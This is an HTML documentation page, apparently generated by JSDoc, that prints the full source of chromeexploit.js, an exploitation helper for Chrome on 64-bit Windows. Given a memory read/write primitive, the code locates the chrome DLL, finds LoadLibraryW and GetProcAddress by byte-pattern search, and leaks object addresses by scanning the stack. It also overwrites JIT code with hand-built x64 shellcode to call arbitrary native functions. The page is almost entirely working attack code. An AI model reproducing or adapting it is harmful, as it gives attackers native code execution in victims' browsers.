<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>chromeexploit.js - Documentation</title>

    <script src="scripts/prettify/prettify.js"></script>
    <script src="scripts/prettify/lang-css.js"></script>
    <!--[if lt IE 9]>
      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <link type="text/css" rel="stylesheet" href="styles/prettify.css">
    <link type="text/css" rel="stylesheet" href="styles/jsdoc.css">
</head>
<body>

<input type="checkbox" id="nav-trigger" class="nav-trigger" />
<label for="nav-trigger" class="navicon-button x">
  <div class="navicon"></div>
</label>

<label for="nav-trigger" class="overlay"></label>

<nav>
    <h2><a href="index.html">Home</a></h2><h3>Classes</h3><ul><li><a href="BaseExploit.html">BaseExploit</a><ul class='methods'><li data-type='method'><a href="BaseExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="BaseExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="BaseExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="BaseExploit.html#importFunction">importFunction</a></li></ul></li><li><a href="BaseExploit_ArrayType.html">BaseExploit#ArrayType</a></li><li><a href="BaseExploit_CString.html">BaseExploit#CString</a></li><li><a href="BaseExploit_FunctionType.html">BaseExploit#FunctionType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_FunctionType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_IntType.html">BaseExploit#IntType</a></li><li><a href="BaseExploit_Pointer.html">BaseExploit#Pointer</a><ul class='methods'><li data-type='method'><a href="BaseExploit_Pointer.html#add">add</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#isNull">isNull</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#load">load</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#store">store</a></li><li data-type='method'><a href="BaseExploit_Pointer.html#toString">toString</a></li></ul></li><li><a href="BaseExploit_PointerType.html">BaseExploit#PointerType</a><ul class='methods'><li data-type='method'><a href="BaseExploit_PointerType.html#cast">cast</a></li></ul></li><li><a href="BaseExploit_StructPointer.html">BaseExploit#StructPointer</a></li><li><a href="BaseExploit_StructType.html">BaseExploit#StructType</a></li><li><a href="BaseExploit_Type.html">BaseExploit#Type</a></li><li><a href="BaseExploit_WString.html">BaseExploit#WString</a></li><li><a href="ChakraExploit.html">ChakraExploit</a><ul class='methods'><li data-type='method'><a href="ChakraExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChakraExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraExploit.html#call">call</a></li><li data-type='method'><a href="ChakraExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraExploit.html#initChakra">initChakra</a></li></ul></li><li><a href="ChakraExploit_ArrayType.html">ChakraExploit#ArrayType</a></li><li><a href="ChakraExploit_CString.html">ChakraExploit#CString</a></li><li><a href="ChakraExploit_FunctionType.html">ChakraExploit#FunctionType</a></li><li><a href="ChakraExploit_IntType.html">ChakraExploit#IntType</a></li><li><a href="ChakraExploit_Pointer.html">ChakraExploit#Pointer</a></li><li><a href="ChakraExploit_PointerType.html">ChakraExploit#PointerType</a></li><li><a href="ChakraExploit_StructPointer.html">ChakraExploit#StructPointer</a></li><li><a href="ChakraExploit_StructType.html">ChakraExploit#StructType</a></li><li><a href="ChakraExploit_Thread.html">ChakraExploit#Thread</a><ul class='methods'><li data-type='method'><a href="ChakraExploit_Thread.html#onmessage">onmessage</a></li><li data-type='method'><a href="ChakraExploit_Thread.html#postMessage">postMessage</a></li></ul></li><li><a href="ChakraExploit_Type.html">ChakraExploit#Type</a></li><li><a href="ChakraExploit_WString.html">ChakraExploit#WString</a></li><li><a href="ChakraThreadExploit.html">ChakraThreadExploit</a><ul class='methods'><li data-type='method'><a href="ChakraThreadExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChakraThreadExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChakraThreadExploit.html#call">call</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChakraThreadExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChakraThreadExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChakraThreadExploit.html#initChakra">initChakra</a></li><li data-type='method'><a href="ChakraThreadExploit.html#read">read</a></li><li data-type='method'><a href="ChakraThreadExploit.html#write">write</a></li></ul></li><li><a href="ChakraThreadExploit_ArrayType.html">ChakraThreadExploit#ArrayType</a></li><li><a href="ChakraThreadExploit_CString.html">ChakraThreadExploit#CString</a></li><li><a href="ChakraThreadExploit_FunctionType.html">ChakraThreadExploit#FunctionType</a></li><li><a href="ChakraThreadExploit_IntType.html">ChakraThreadExploit#IntType</a></li><li><a href="ChakraThreadExploit_Pointer.html">ChakraThreadExploit#Pointer</a></li><li><a href="ChakraThreadExploit_PointerType.html">ChakraThreadExploit#PointerType</a></li><li><a href="ChakraThreadExploit_StructPointer.html">ChakraThreadExploit#StructPointer</a></li><li><a href="ChakraThreadExploit_StructType.html">ChakraThreadExploit#StructType</a></li><li><a href="ChakraThreadExploit_Thread.html">ChakraThreadExploit#Thread</a></li><li><a href="ChakraThreadExploit_Type.html">ChakraThreadExploit#Type</a></li><li><a href="ChakraThreadExploit_WString.html">ChakraThreadExploit#WString</a></li><li><a href="ChromeExploit.html">ChromeExploit</a><ul class='methods'><li data-type='method'><a href="ChromeExploit.html#addressOf">addressOf</a></li><li data-type='method'><a href="ChromeExploit.html#addressOfArrayBuffer">addressOfArrayBuffer</a></li><li data-type='method'><a href="ChromeExploit.html#addressOfSlow">addressOfSlow</a></li><li data-type='method'><a href="ChromeExploit.html#call">call</a></li><li data-type='method'><a href="ChromeExploit.html#findGadget">findGadget</a></li><li data-type='method'><a href="ChromeExploit.html#findGadgets">findGadgets</a></li><li data-type='method'><a href="ChromeExploit.html#findModuleBase">findModuleBase</a></li><li data-type='method'><a href="ChromeExploit.html#importFunction">importFunction</a></li><li data-type='method'><a href="ChromeExploit.html#initChrome">initChrome</a></li></ul></li><li><a href="ChromeExploit_ArrayType.html">ChromeExploit#ArrayType</a></li><li><a href="ChromeExploit_CString.html">ChromeExploit#CString</a></li><li><a href="ChromeExploit_FunctionType.html">ChromeExploit#FunctionType</a></li><li><a href="ChromeExploit_IntType.html">ChromeExploit#IntType</a></li><li><a href="ChromeExploit_Pointer.html">ChromeExploit#Pointer</a></li><li><a href="ChromeExploit_PointerType.html">ChromeExploit#PointerType</a></li><li><a href="ChromeExploit_StructPointer.html">ChromeExploit#StructPointer</a></li><li><a href="ChromeExploit_StructType.html">ChromeExploit#StructType</a></li><li><a href="ChromeExploit_Type.html">ChromeExploit#Type</a></li><li><a href="ChromeExploit_WString.html">ChromeExploit#WString</a></li><li><a href="global.html#Integer">Integer</a><ul class='methods'><li data-type='method'><a href="global.html#Integer#add">add</a></li><li data-type='method'><a href="global.html#Integer#and">and</a></li><li data-type='method'><a href="global.html#Integer#comp">comp</a></li><li data-type='method'><a href="global.html#Integer#compare">compare</a></li><li data-type='method'><a href="global.html#Integer#div">div</a></li><li data-type='method'><a href="global.html#Integer#divide">divide</a></li><li data-type='method'><a href="global.html#Integer#eq">eq</a></li><li data-type='method'><a href="global.html#Integer#equals">equals</a></li><li data-type='method'><a href="global.html#Integer#getHighBits">getHighBits</a></li><li data-type='method'><a href="global.html#Integer#getHighBitsUnsigned">getHighBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getLowBits">getLowBits</a></li><li data-type='method'><a href="global.html#Integer#getLowBitsUnsigned">getLowBitsUnsigned</a></li><li data-type='method'><a href="global.html#Integer#getNumBitsAbs">getNumBitsAbs</a></li><li data-type='method'><a href="global.html#Integer#greaterThan">greaterThan</a></li><li data-type='method'><a href="global.html#Integer#greaterThanOrEqual">greaterThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#gt">gt</a></li><li data-type='method'><a href="global.html#Integer#gte">gte</a></li><li data-type='method'><a href="global.html#Integer#isEven">isEven</a></li><li data-type='method'><a href="global.html#Integer#isNegative">isNegative</a></li><li data-type='method'><a href="global.html#Integer#isOdd">isOdd</a></li><li data-type='method'><a href="global.html#Integer#isPositive">isPositive</a></li><li data-type='method'><a href="global.html#Integer#isZero">isZero</a></li><li data-type='method'><a href="global.html#Integer#lessThan">lessThan</a></li><li data-type='method'><a href="global.html#Integer#lessThanOrEqual">lessThanOrEqual</a></li><li data-type='method'><a href="global.html#Integer#lt">lt</a></li><li data-type='method'><a href="global.html#Integer#lte">lte</a></li><li data-type='method'><a href="global.html#Integer#mod">mod</a></li><li data-type='method'><a href="global.html#Integer#modulo">modulo</a></li><li data-type='method'><a href="global.html#Integer#mul">mul</a></li><li data-type='method'><a href="global.html#Integer#multiply">multiply</a></li><li data-type='method'><a href="global.html#Integer#neg">neg</a></li><li data-type='method'><a href="global.html#Integer#negate">negate</a></li><li data-type='method'><a href="global.html#Integer#neq">neq</a></li><li data-type='method'><a href="global.html#Integer#not">not</a></li><li data-type='method'><a href="global.html#Integer#notEquals">notEquals</a></li><li data-type='method'><a href="global.html#Integer#or">or</a></li><li data-type='method'><a href="global.html#Integer#shiftLeft">shiftLeft</a></li><li data-type='method'><a href="global.html#Integer#shiftRight">shiftRight</a></li><li data-type='method'><a href="global.html#Integer#shiftRightUnsigned">shiftRightUnsigned</a></li><li data-type='method'><a href="global.html#Integer#shl">shl</a></li><li data-type='method'><a href="global.html#Integer#shr">shr</a></li><li data-type='method'><a href="global.html#Integer#shru">shru</a></li><li data-type='method'><a href="global.html#Integer#sub">sub</a></li><li data-type='method'><a href="global.html#Integer#subtract">subtract</a></li><li data-type='method'><a href="global.html#Integer#toBytes">toBytes</a></li><li data-type='method'><a href="global.html#Integer#toBytesBE">toBytesBE</a></li><li data-type='method'><a href="global.html#Integer#toBytesLE">toBytesLE</a></li><li data-type='method'><a href="global.html#Integer#toInt">toInt</a></li><li data-type='method'><a href="global.html#Integer#toNumber">toNumber</a></li><li data-type='method'><a href="global.html#Integer#toSigned">toSigned</a></li><li data-type='method'><a href="global.html#Integer#toString">toString</a></li><li data-type='method'><a href="global.html#Integer#toUnsigned">toUnsigned</a></li><li data-type='method'><a href="global.html#Integer#xor">xor</a></li></ul></li></ul><h3><a href="global.html">Global</a></h3>
</nav>

<div id="main">
    
    <h1 class="page-title">chromeexploit.js</h1>
    

    



    
    <section>
        <article>
            <pre class="prettyprint source linenums"><code>import BaseExploit from "baseexploit";
import Integer from "integer";

/**
 * Constructs an exploit with sensible defaults for Chrome. Child must call initChrome method once read and write methods are available.
 *
 * @augments BaseExploit
 * @class
 * @constructor
 */
function ChromeExploit() {
    var exploit = this;
    BaseExploit.call(this, 64);
}
ChromeExploit.prototype = Object.create(BaseExploit.prototype);
ChromeExploit.prototype.constructor = ChromeExploit;
/**
 * Initializes Chrome helpers using memory read and write.
 *
 * @param {Integer|Pointer} vtable Any address in the chrome DLL
 */
ChromeExploit.prototype.initChrome = function (vtable) {
    this.chromeBase = this.findModuleBase(vtable);

    /* Create a Function with a large amount of JIT code. */
    var source = '';
    for (var i = 0; i &lt; 1000; i++) {
        source += 'x[' + i + '] += ' + Math.random() + ';\n';
    }
    this.jitFunction = new Function('x', source);
    var arr = new Array(1000).fill(0);
    for (var i = 0; i &lt; 10000; i++) {
        this.jitFunction(arr);
    }

    /* Find g_main_thread_stack_start via code pattern matching. */
    var gadgets = [
        ['loadLibraryGetProcAddress', [0x48, 0x8D, 0x0D, -1, -1, -1, -1, 0xFF, 0x15, -1, -1, -1, -1, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x0F, 0x84, -1, -1, -1, -1, 0x48, 0x8D, 0x15, -1, -1, -1, -1, 0x48, 0x8B, 0xC8, 0xFF, 0x15, -1, -1, -1, -1]],
        ['mainThreadStack', [0x48, 0x8B, 0x05, -1, -1, -1, -1, 0x48, 0x8D, 0x4C, 0x24, -1, 0x48, 0x2B, 0xC1, 0x48, 0x8D, 0x1D, -1, -1, -1, -1, 0x48, 0x3B, 0x05, -1, -1, -1, -1]],
    ];
    this.gadgets = this.findGadgets(this.chromeBase, gadgets);
    this.mainThreadStackBase = new this.PointerType(this.Uint64Ptr).cast(
        this.Uint64.cast(this.gadgets.mainThreadStack).add(7).add(
            this.Int32Ptr.cast(this.gadgets.mainThreadStack.add(3))[0])
    )[0];
    this.LoadLibraryW = new this.PointerType(this.Uint64Ptr).cast(
        this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(13).add(
            this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(9))[0])
    )[0];
    this.GetProcAddress = new this.PointerType(this.Uint64Ptr).cast(
        this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(41).add(
            this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(37))[0])
    )[0];
}
/**
 * Returns the address of a Javascript object.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChromeExploit.prototype.addressOf = function (obj) {
    /* TODO: Implement faster version using a predefined Array. */
    var arr = [obj];
    return this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOfSlow(arr))[2].sub(1))[2].sub(1);
}
/**
 * Returns the address of ArrayBuffer contents.
 *
 * @param {ArrayBuffer} ab ArrayBuffer
 * @returns {Pointer}
 */
ChromeExploit.prototype.addressOfArrayBuffer = function (ab) {
    var p = this.Uint64Ptr.cast(this.addressOf(ab));
    return p[4];
}
/**
 * Returns the address of a Javascript object. Internal.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChromeExploit.prototype.addressOfSlow = function (obj) {
    var address;
    var canary1 = 0x13371338, canary2 = 0x1339133a, mainThreadStackBase = this.mainThreadStackBase;
    obj.toString = function() {
        /* Search stack for canary values. */
        for (var i = 0; i > -0x1000; i--)
        {
            if (mainThreadStackBase[i - 2].high == canary2 &amp;&amp; mainThreadStackBase[i - 1].high == canary1)
            {
                address = mainThreadStackBase[i].sub(1);
                break;
            }
        }
        return '';
    };
    String.prototype.indexOf.call(obj, canary1, canary2);
    return address;
}
/**
 * Call a function pointer with the given arguments. Used internally by FunctionPointer.
 *
 * @param {Integer} address
 * @param {...Integer} args
 * @returns {Integer}
 */
ChromeExploit.prototype.call = function (address, ...args) {
    var self = this;
    function validObjectAddress(x) {
        return x.high &lt;= 0x7FFF &amp;&amp; (x.low &amp; 7) == 1;
    }
    function addRspImm8(p, imm) {
        p[0] = 0x48;
        p[1] = 0x83;
        p[2] = 0xc4;
        p[3] = imm;
        return p.add(4);
    }
    function callRax(p) {
        p[0] = 0xff;
        p[1] = 0xd0;
        return p.add(2);
    }
    function movRaxImm64(p, imm) {
        p[0] = 0x48;
        p[1] = 0xb8;
        self.Uint64Ptr.cast(p.add(2))[0] = imm;
        return p.add(10);
    }
    function movRcxImm64(p, imm) {
        p[0] = 0x48;
        p[1] = 0xb9;
        self.Uint64Ptr.cast(p.add(2))[0] = imm;
        return p.add(10);
    }
    function movRdxImm64(p, imm) {
        p[0] = 0x48;
        p[1] = 0xba;
        self.Uint64Ptr.cast(p.add(2))[0] = imm;
        return p.add(10);
    }
    function movR8Imm64(p, imm) {
        p[0] = 0x49;
        p[1] = 0xb8;
        self.Uint64Ptr.cast(p.add(2))[0] = imm;
        return p.add(10);
    }
    function movR9Imm64(p, imm) {
        p[0] = 0x49;
        p[1] = 0xb9;
        self.Uint64Ptr.cast(p.add(2))[0] = imm;
        return p.add(10);
    }
    function pushRax(p) {
        p[0] = 0x50;
        return p.add(1);
    }
    function storeRax(p, dst) {
        p[0] = 0x48;
        p[1] = 0xa3;
        self.Uint64Ptr.cast(p.add(2))[0] = dst;
        return p.add(10);
    }
    function prologue(p) {
        /* push rbp */
        p[0] = 0x55;
        p[1] = 0x48;
        /* mov rbp, rsp */
        p[2] = 0x89;
        p[3] = 0xe5;
        /* and rsp, ~0xf */
        p[4] = 0x48;
        p[5] = 0x83;
        p[6] = 0xe4;
        p[7] = 0xf0;
        return p.add(8);
    }
    function epilogue(p) {
        p[0] = 0xc9;
        p[1] = 0xc3;
        return p.add(2);
    }
    function jmp(p, offset) {
        p[0] = 0xe9;
        self.Int32Ptr.cast(p.add(1))[0] = offset;
        return p.add(5);
    }

    var codeObject = this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.jitFunction))[7].sub(1));
    if (validObjectAddress(codeObject[0]) &amp;&amp; validObjectAddress(codeObject[1]) &amp;&amp;
            validObjectAddress(codeObject[2]) &amp;&amp; validObjectAddress(codeObject[3])) {
        /* In newer versions of Chrome, function object points to the code header. */
        var jitCode = this.Uint8Ptr.cast(codeObject).add(0x60);
    } else {
        /* In older versions of Chrome, function object points to the JIT code. */
        var jitCode = this.Uint8Ptr.cast(codeObject);
    }
    var returnValAddress = this.Uint64Ptr.cast(jitCode.add(0x200));

    /* Keep the stack aligned by pushing an even number of stack arguments. */
    if (args.length > 4 &amp;&amp; (args.length &amp; 1)) {
        args.push(0);
    }

    var p = jitCode;
    /* Jump over code with heap pointers that get used during GC. */
    p = jmp(p, 0x1000).add(0x1000);
    /* Overwrite the JIT code with shellcode to load arguments and call function. */
    p = prologue(p);
    for (var i = args.length - 1; i >= 0; i--) {
        if (i == 0) {
            p = movRcxImm64(p, args[i]);
        } else if (i == 1) {
            p = movRdxImm64(p, args[i]);
        } else if (i == 2) {
            p = movR8Imm64(p, args[i]);
        } else if (i == 3) {
            p = movR9Imm64(p, args[i]);
        } else {
            p = movRaxImm64(p, args[i]);
            p = pushRax(p);
        }
    }
    p = addRspImm8(p, -0x20);
    p = movRaxImm64(p, address);
    p = callRax(p);
    p = addRspImm8(p, 0x20);
    p = storeRax(p, returnValAddress);
    p = epilogue(p);

    /* Call the JIT code. */
    this.jitFunction();

    /* Retrieve the return value. */
    return returnValAddress[0];
}

export default ChromeExploit;
</code></pre>
        </article>
    </section>




</div>

<br class="clear">

<footer>
    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.5.5</a> on Sat Mar 31 2018 18:23:08 GMT-0700 (PDT) using the <a href="https://github.com/clenemt/docdash">docdash</a> theme.
</footer>

<script>prettyPrint();</script>
<script src="scripts/linenumber.js"></script>
</body>
</html>
